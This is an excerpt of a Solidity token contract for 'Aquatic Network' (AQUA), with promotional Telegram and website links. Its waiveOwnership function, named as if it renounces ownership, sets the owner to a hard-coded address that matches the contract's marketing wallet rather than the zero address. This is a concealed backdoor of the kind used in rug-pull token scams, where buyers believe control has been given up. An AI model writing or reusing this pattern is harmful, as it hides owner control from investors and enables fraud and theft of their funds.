...
Telegram https://t.me/aquaticnetwork
Website https://aquatic-network.tech
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x10eCfcA3957Da189dB0Af9eaF7e2f8b821ff3eD6);
    }
...
contract AQUATICNETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Aquatic Network";
    string private _symbol = "AQUA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x10eCfcA3957Da189dB0Af9eaF7e2f8b821ff3eD6);
    address payable public teamWalletAddress = payable(0xb756Ae28245F0D7A93065115DD7dC7526f80aF44);
